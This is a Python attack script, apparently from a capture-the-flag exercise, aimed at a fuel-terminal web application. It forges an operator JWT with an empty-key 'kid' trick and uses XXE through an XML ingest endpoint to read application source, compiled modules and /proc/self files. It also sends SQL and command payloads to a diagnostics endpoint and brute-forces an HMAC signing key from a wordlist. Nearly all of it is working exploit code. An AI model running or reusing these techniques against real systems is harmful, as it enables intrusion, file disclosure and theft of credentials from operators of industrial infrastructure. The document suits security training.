#!/usr/bin/env python3
"""round45 — diagnostics endpoint, db.py re-read, /proc/self/fd, alt signing formats, more modules"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: /api/ops/diagnostics — ПОЛНЫЙ ДАМП")
print("="*70)

# GET
for endpoint in ["/api/ops/diagnostics", "/ops/diagnostics",
                 "/api/ops/diagnostics/config", "/api/ops/diagnostics/probe",
                 "/api/ops/diagnostics/system", "/api/ops/diagnostics/env",
                 "/api/ops/diagnostics/health", "/api/ops/diagnostics/info",
                 "/api/ops/diagnostics/status"]:
    try:
        r = S.get(f"{CASPI}{endpoint}", headers=AUTH_OP, timeout=5)
        if r.status_code not in [404, 405]:
            print(f"\n  GET [{r.status_code}] {endpoint}:")
            print(f"  {r.text[:1000]}")
    except Exception as e:
        print(f"  [ERR] GET {endpoint}: {e}")

# POST
for endpoint in ["/api/ops/diagnostics"]:
    for payload in [
        {},
        {"action": "status"},
        {"action": "config"},
        {"action": "probe"},
        {"action": "env"},
        {"action": "ping", "target": "gauge-gw.internal"},
        {"command": "env"},
        {"query": "SELECT * FROM devices"},
    ]:
        try:
            r = S.post(f"{CASPI}{endpoint}",
                json=payload, headers=AUTH_OP, timeout=5)
            if r.status_code not in [404, 405]:
                print(f"\n  POST [{r.status_code}] {endpoint} {json.dumps(payload)[:60]}:")
                print(f"  {r.text[:500]}")
        except Exception as e:
            print(f"  [ERR] POST {endpoint}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: db.py — ПОЛНОЕ СОДЕРЖИМОЕ")
print("="*70)

for field in ["remarks", "carrier", "reference"]:
    st, val = xxe_read("/app/db.py", field)
    if st == "OK" and val:
        print(f"\n  db.py через {field} ({len(val)} символов):")
        for line in val.split('\n'):
            print(f"    {line}")
        break

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ДРУГИЕ PYTHON МОДУЛИ")
print("="*70)

modules = [
    "/app/probe.py", "/app/probes.py", "/app/signing.py",
    "/app/config.py", "/app/settings.py", "/app/constants.py",
    "/app/routes.py", "/app/views.py", "/app/api.py",
    "/app/ops.py", "/app/custody.py", "/app/models.py",
    "/app/utils.py", "/app/helpers.py", "/app/middleware.py",
    "/app/blueprints.py", "/app/extensions.py",
    "/app/__init__.py", "/app/factory.py",
    # Может быть в подпапках
    "/app/api/__init__.py", "/app/api/probe.py", "/app/api/ops.py",
    "/app/ops/__init__.py", "/app/ops/probe.py",
    "/app/routes/__init__.py", "/app/routes/probe.py",
    "/app/routes/ops.py",
]

for fp in modules:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp} ({len(val)} символов):")
        for line in val.split('\n')[:30]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {fp}")

# Также проверяем __pycache__ для новых модулей
pycache_modules = [
    "/app/__pycache__/probe.cpython-311.pyc",
    "/app/__pycache__/config.cpython-311.pyc",
    "/app/__pycache__/routes.cpython-311.pyc",
    "/app/__pycache__/ops.cpython-311.pyc",
    "/app/__pycache__/models.cpython-311.pyc",
    "/app/__pycache__/utils.cpython-311.pyc",
    "/app/__pycache__/signing.cpython-311.pyc",
    "/app/__pycache__/constants.cpython-311.pyc",
    "/app/__pycache__/settings.cpython-311.pyc",
    "/app/__pycache__/__init__.cpython-311.pyc",
]

for fp in pycache_modules:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [НАЙДЕН READABLE!] {fp}")
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ] {fp}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: /proc/self/fd/ — ОТКРЫТЫЕ ФАЙЛОВЫЕ ДЕСКРИПТОРЫ")
print("="*70)

# Читаем /proc/self/fd/ — это симлинки на открытые файлы
# Через XXE мы можем следовать симлинкам!
for fd_num in range(20):
    st, val = xxe_read(f"/proc/self/fd/{fd_num}")
    if st == "OK" and val:
        print(f"  fd/{fd_num}: '{val[:200]}'")
    elif st == "BIN":
        print(f"  fd/{fd_num}: EXISTS (binary)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: /proc/self/maps — ЗАГРУЖЕННЫЕ БИБЛИОТЕКИ")
print("="*70)

st, val = xxe_read("/proc/self/maps")
if st == "OK":
    lines = val.split('\n')
    # Ищем интересные библиотеки (не стандартные)
    seen = set()
    for line in lines:
        parts = line.split()
        if len(parts) >= 6:
            fpath = parts[5]
            if fpath not in seen and fpath.startswith('/'):
                seen.add(fpath)
                # Только не-стандартные библиотеки
                if '/app/' in fpath or 'site-packages' in fpath or \
                   'secret' in fpath.lower() or 'probe' in fpath.lower() or \
                   'config' in fpath.lower():
                    print(f"  {fpath}")
    print(f"  Всего уникальных путей: {len(seen)}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: АЛЬТЕРНАТИВНЫЕ ФОРМАТЫ ПОДПИСИ")
print("="*70)

# Известные пары device → url → sig
pairs = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
]

# Набор ключевых слов для теста
test_keys = [
    b"secret", b"probe", b"probe_secret", b"PROBE_SECRET",
    b"CaspiTerminal", b"terminal", b"caspi", b"caspiterminal",
    b"llehs", b"LLEHS", b"shell", b"SHELL",
    b"gauge-gw", b"gauge", b"gateway", b"oil", b"depot",
    b"khs-oil-depot", b"kazhackstan", b"KazHackStan",
    b"5407f6317f5c", b"terminal_web_pw",
    b"aktau", b"mangystau", b"atyrau", b"caspian",
    b"scada", b"ot", b"ics", b"plc",
    b"diesel", b"fuel", b"tanker", b"loading",
    # Reversed
    b"terces", b"eborp", b"terces_eborp",
    # Common CTF
    b"flag", b"ctf", b"admin", b"password", b"root",
    b"supersecret", b"changeme", b"letmein",
    # UUID-like
    b"c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95",  # lfi flag hash
    b"c8142af02727b3d7d51e4aece866104b",  # xxe flag hash
]

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

device = b"lm-01"

print("  Тестируем разные форматы сообщения...")
found_key = None

for key in test_keys:
    messages = [
        (key, known_url, "HMAC(key, url)"),
        (key, device + b":" + known_url, "HMAC(key, device:url)"),
        (key, device + b"|" + known_url, "HMAC(key, device|url)"),
        (key, device + b"/" + known_url, "HMAC(key, device/url)"),
        (key, device + b" " + known_url, "HMAC(key, device url)"),
        (key, device + known_url, "HMAC(key, deviceurl)"),
        (key, known_url + b"\n", "HMAC(key, url+newline)"),
    ]
    for k, msg, fmt in messages:
        h = hm.new(k, msg, hashlib.sha256).hexdigest()
        if h == known_sig:
            print(f"\n  НАЙДЕН! key='{k.decode()}', format={fmt}")
            # Проверяем на 2-й паре
            dev2, url2, sig2 = pairs[1]
            if fmt == "HMAC(key, url)":
                msg2 = url2.encode()
            elif fmt == "HMAC(key, device:url)":
                msg2 = dev2.encode() + b":" + url2.encode()
            elif fmt == "HMAC(key, device|url)":
                msg2 = dev2.encode() + b"|" + url2.encode()
            elif fmt == "HMAC(key, device/url)":
                msg2 = dev2.encode() + b"/" + url2.encode()
            elif fmt == "HMAC(key, device url)":
                msg2 = dev2.encode() + b" " + url2.encode()
            elif fmt == "HMAC(key, deviceurl)":
                msg2 = dev2.encode() + url2.encode()
            elif fmt == "HMAC(key, url+newline)":
                msg2 = url2.encode() + b"\n"
            h2 = hm.new(k, msg2, hashlib.sha256).hexdigest()
            if h2 == sig2:
                print(f"  ПОДТВЕРЖДЕНО на 2-й паре!")
                found_key = k
            else:
                print(f"  НЕ подтверждено на 2-й паре ({h2[:16]}... vs {sig2[:16]}...)")
            break
    if found_key:
        break

if not found_key:
    print("  Ни одна комбинация не совпала")

    # А что если подписывается только путь URL (без хоста)?
    print("\n  Тест: может подписывается только path часть URL?")
    path = b"/v1/meters/loading-arm-1/flow"
    for key in test_keys[:15]:
        h = hm.new(key, path, hashlib.sha256).hexdigest()
        if h == known_sig:
            print(f"  HMAC('{key.decode()}', path) СОВПАДАЕТ!")
            found_key = key

    # Или JSON формат?
    print("\n  Тест: может подписывается JSON?")
    json_msg = json.dumps({"url": known_url.decode()}).encode()
    json_msg2 = json.dumps({"device": "lm-01", "url": known_url.decode()}).encode()
    json_msg3 = json.dumps({"url": known_url.decode(), "device": "lm-01"}).encode()
    for key in test_keys[:15]:
        for msg, label in [(json_msg, "JSON(url)"), (json_msg2, "JSON(dev+url)"), (json_msg3, "JSON(url+dev)")]:
            h = hm.new(key, msg, hashlib.sha256).hexdigest()
            if h == known_sig:
                print(f"  HMAC('{key.decode()}', {label}) СОВПАДАЕТ!")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: FLASK ОШИБКИ — ПОПЫТКА ВЫЗВАТЬ TRACEBACK")
print("="*70)

error_tests = [
    # Probe с невалидными типами
    (f"{CASPI}/api/ops/probe", "POST", {"url": None, "sig": None}),
    (f"{CASPI}/api/ops/probe", "POST", {"url": 123, "sig": 456}),
    (f"{CASPI}/api/ops/probe", "POST", "not json"),
    # Custody с невалидным XML
    (f"{CASPI}/api/ops/custody/ingest", "POST_XML", "<<<invalid>>>"),
    (f"{CASPI}/api/ops/custody/ingest", "POST_XML", ""),
    # Разные HTTP методы
    (f"{CASPI}/api/ops/probe", "PUT", {"url": "test"}),
    (f"{CASPI}/api/ops/probe", "DELETE", None),
    (f"{CASPI}/api/ops/probe", "PATCH", {"url": "test"}),
    # Probe sign без параметров
    (f"{CASPI}/api/ops/probe/sign", "GET_NOPARAM", None),
    # Несуществующие endpoints
    (f"{CASPI}/api/ops/probe/config", "GET", None),
    (f"{CASPI}/api/ops/probe/secret", "GET", None),
    (f"{CASPI}/api/ops/probe/key", "GET", None),
    (f"{CASPI}/api/ops/probe/debug", "GET", None),
]

for url, method, payload in error_tests:
    try:
        if method == "POST":
            r = S.post(url, json=payload, headers=AUTH_OP, timeout=5)
        elif method == "POST_XML":
            r = S.post(url, data=payload,
                headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
        elif method == "PUT":
            r = S.put(url, json=payload, headers=AUTH_OP, timeout=5)
        elif method == "DELETE":
            r = S.delete(url, headers=AUTH_OP, timeout=5)
        elif method == "PATCH":
            r = S.patch(url, json=payload, headers=AUTH_OP, timeout=5)
        elif method == "GET_NOPARAM":
            r = S.get(url, headers=AUTH_OP, timeout=5)
        else:
            r = S.get(url, headers=AUTH_OP, timeout=5)

        # Ищем traceback или debug info
        if r.status_code >= 500 or 'Traceback' in r.text or 'File "' in r.text:
            print(f"\n  [{r.status_code}] {method} {url.replace(CASPI,'')}:")
            print(f"  {r.text[:500]}")
        elif r.status_code not in [400, 403, 404, 405]:
            print(f"  [{r.status_code}] {method} {url.replace(CASPI,'')}: {r.text[:100]}")
    except Exception as e:
        print(f"  [ERR] {method} {url.replace(CASPI,'')}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ШАБЛОНЫ (TEMPLATES)")
print("="*70)

templates = [
    "/app/templates/base.html",
    "/app/templates/layout.html",
    "/app/templates/index.html",
    "/app/templates/ops/index.html",
    "/app/templates/ops/custody.html",
    "/app/templates/ops/diagnostics.html",
    "/app/templates/ops/probe.html",
    "/app/templates/portal/index.html",
    "/app/templates/portal/dashboard.html",
    "/app/templates/auth/login.html",
    "/app/templates/auth/register.html",
    "/app/templates/errors/404.html",
    "/app/templates/errors/500.html",
]

for fp in templates:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp} ({len(val)} символов):")
        for line in val.split('\n')[:20]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {fp}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: POSTGRESQL — ЧИТАЕМ db.py И ПРОБУЕМ SQL ЧЕРЕЗ DIAGNOSTICS")
print("="*70)

# Перечитаем db.py полностью
st, val = xxe_read("/app/db.py", "remarks")
if st == "OK":
    print(f"\n  db.py ({len(val)} символов):")
    for line in val.split('\n'):
        print(f"    {line}")

# Если в db.py есть функции для probe_secret, это может быть в БД
# Также попробуем diagnostics endpoint с SQL
for sql in ["SELECT * FROM probe_config",
            "SELECT * FROM config",
            "SELECT * FROM secrets",
            "SELECT * FROM settings",
            "SELECT probe_secret FROM config",
            "SELECT * FROM devices LIMIT 5"]:
    try:
        r = S.post(f"{CASPI}/api/ops/diagnostics",
            json={"sql": sql}, headers=AUTH_OP, timeout=5)
        if r.status_code not in [404, 405]:
            print(f"\n  SQL [{r.status_code}]: {sql}")
            print(f"  {r.text[:300]}")
    except:
        pass

    try:
        r = S.post(f"{CASPI}/api/ops/diagnostics",
            json={"query": sql}, headers=AUTH_OP, timeout=5)
        if r.status_code not in [404, 405]:
            print(f"\n  query [{r.status_code}]: {sql}")
            print(f"  {r.text[:300]}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
